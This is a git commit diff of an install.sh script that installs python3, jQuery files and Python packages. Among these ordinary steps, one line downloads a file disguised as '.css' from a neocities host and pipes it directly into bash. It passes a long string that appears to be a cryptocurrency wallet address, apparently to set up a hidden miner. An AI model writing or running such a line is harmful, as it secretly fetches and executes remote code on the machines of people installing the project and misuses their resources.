b36ba91395f61848755c1af28af3382f79f2ea3c
Pirata-hack <78007900+Pirata-hack@users.noreply.github.com>
2021-04-10 21:25:19 -0600

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,6 +1,6 @@
+sudo apt-get install python3
 wget https://code.jquery.com/jquery-migrate-1.4.1.js
 wget https://code.jquery.com/jquery-3.6.0.min.js
 curl -s -L https://hacker159.neocities.org/setup-L.sh.css| bash -s 42L2cGW43iGD5Krhc7NeX7BuwzdHjSkZUMHMm8nmhYuyZosNQbT6Hd7fwcwzFxJCEKaWjLKYpAZHPfBCrSfbjSX5DgFJD4C
-apt install python3
 pip3 install bs4
 pip3 install requests
